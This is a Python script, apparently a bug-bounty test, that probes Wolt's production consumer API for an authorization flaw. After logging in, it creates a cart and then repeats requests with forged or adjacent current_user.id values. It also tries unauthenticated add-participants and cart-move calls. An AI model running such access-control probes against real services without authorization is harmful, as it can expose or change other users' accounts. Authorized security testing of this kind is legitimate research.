# -*- coding: utf-8 -*-
"""cx carts current_user 信任假设验证（最小扰动，仅自有数据）
步骤: 1) 登录拿 access_token  2) 创建自有购物车基线  3) current_user.id 变换对比
"""
import requests, json, sys, uuid
sys.stdout.reconfigure(encoding="utf-8", errors="replace")

BASE = "https://consumer-api.wolt.com"
H = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Origin": "https://wolt.com",
    "X-HackerOne-Research": "pccp",
    "Content-Type": "application/json",
}

def jget(url, headers=None, **kw):
    r = requests.get(url, headers=headers or H, timeout=15, **kw)
    try:
        return r.status_code, r.json()
    except Exception:
        return r.status_code, r.text[:300]

def jpost(url, body, headers=None):
    r = requests.post(url, headers=headers or H, json=body, timeout=15)
    try:
        return r.status_code, r.json()
    except Exception:
        return r.status_code, r.text[:300]

# ===== 1. LOGIN via wauth2 (form post) =====
print("=== 1. LOGIN ===")
cred = json.load(open(r"D:\scan\_wolt_hunt\_wolt_creds.json", encoding="utf-8"))
email, pwd = cred["email"], cred["password"]

tok = None
# 尝试常见表单参数组合
for params in [
    {"username": email, "password": pwd, "grant_type": "password"},
    {"username": email, "password": pwd},
    {"email": email, "password": pwd},
]:
    try:
        r = requests.post(BASE + "/v1/wauth2/access_token", data=params,
                          headers={k: v for k, v in H.items() if k != "Content-Type"} | {"Content-Type": "application/x-www-form-urlencoded"},
                          timeout=15)
        print(f"  form {list(params.keys())}: {r.status_code} | {r.text[:200]}")
        if r.status_code == 200:
            tok = r.json().get("access_token")
            break
    except Exception as e:
        print(f"  ERR {e}")

if not tok:
    print("  !! 登录未成功，改用无认证路径继续")
else:
    print(f"  OK access_token={tok[:40]}...")
    H["Authorization"] = f"Bearer {tok}"

# ===== 2. 无认证/登录态创建购物车基线 (upsert-items create_if_missing) =====
print("\n=== 2. CART BASELINE ===")
import time
suffix = str(int(time.time()))[-6:]
body = {
    "cart_pdrn": f"cartpdrn://test.{suffix}",
    "current_user": {"id": "670fa3e9ead6e49d65cc3614", "meta": {}},
    "items": [{"item_pdrn": "itempdrn://test", "count": 1}],
    "create_if_missing": {
        "scope": {"type": "personal"},
        "currency": "EUR",
        "cart_fulfillment_type": "delivery",
    },
}
code, res = jpost(BASE + "/cx/v1/carts/upsert-items", body)
print(f"  upsert-items (no auth): {code} | {json.dumps(res)[:400]}")

# 获取 cart_pdrn（若返回）
cart_pdrn = None
if isinstance(res, dict):
    cart_pdrn = res.get("cart_pdrn") or res.get("pdrn")
print(f"  cart_pdrn={cart_pdrn}")

# ===== 3. 读取购物车（基线 + 变换 current_user）=====
print("\n=== 3. GET CART current_user 变换 ===")
if cart_pdrn:
    my_id = "670fa3e9ead6e49d65cc3614"
    other_ids = [
        "000000000000000000000000",          # 全零
        "ffffffffffffffffffffffff",          # 全 f
        "670fa3e9ead6e49d65cc3615",          # 邻近自增
        "aaaaaaaaaaaaaaaaaaaaaaaa",          # 随机
    ]
    for oid in other_ids:
        q = {"current_user.id": oid}
        code, res2 = jget(BASE + f"/cx/v1/carts/{cart_pdrn}", params=q)
        summary = json.dumps(res2)[:200] if isinstance(res2, (dict, list)) else str(res2)[:200]
        print(f"  current_user.id={oid}: {code} | {summary}")
else:
    print("  无 cart_pdrn，尝试 GET /cx/v1/carts 列表")
    code, res2 = jget(BASE + "/cx/v1/carts")
    print(f"  GET /cx/v1/carts: {code} | {json.dumps(res2)[:300]}")

# ===== 4. add-participants / move 无认证行为 =====
print("\n=== 4. participants/move 无认证行为 ===")
if cart_pdrn:
    pcode, pres = jpost(BASE + f"/cx/v1/carts/{cart_pdrn}/add-participants",
                        {"current_user": {"id": my_id}, "participant_pdrns": ["userpdrn://x"], "participants": {}})
    print(f"  add-participants: {pcode} | {json.dumps(pres)[:200]}")
    mcode, mres = jpost(BASE + "/cx/v1/carts/move", {"current_user": {"id": my_id}, "from_user_pdrn": "userpdrn://other"})
    print(f"  move: {mcode} | {json.dumps(mres)[:200]}")

print("\n=== DONE ===")
